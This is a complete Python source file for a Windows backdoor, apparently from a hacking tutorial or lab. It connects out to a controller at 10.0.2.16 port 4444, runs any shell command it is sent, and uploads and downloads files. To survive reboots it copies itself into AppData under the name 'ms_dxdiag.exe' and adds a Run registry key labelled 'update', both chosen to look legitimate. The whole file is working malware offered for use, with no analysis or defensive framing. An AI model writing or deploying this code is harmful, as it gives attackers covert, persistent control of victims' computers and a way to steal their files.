#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        hidden_location = os.environ["appdata"] + "\\ms_dxdiag.exe"
        if not os.path.exists(hidden_location):
            shutil.copyfile(sys.executable, hidden_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'
                            + hidden_location + '"', shell=True)

    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    @staticmethod
    def execute_system_command(command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    @staticmethod
    def change_working_directory_to(path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    @staticmethod
    def read_file(path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    @staticmethod
    def write_file(path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful!"

    def run(self):
        while True:
            received_command = self.receive()
            try:
                if received_command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif received_command[0] == "cd" and len(received_command) > 1:
                    command_result = self.change_working_directory_to(received_command[1])
                elif received_command[0] == "download":
                    command_result = self.read_file(received_command[1]).decode()
                elif received_command[0] == "upload":
                    command_result = self.write_file(received_command[1], received_command[2])
                else:
                    command_result = self.execute_system_command(received_command).decode()
                self.send(command_result)
            except Exception:
                print("[-] Something went wrong")


try:
    my_backdoor = Backdoor("10.0.2.16", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()
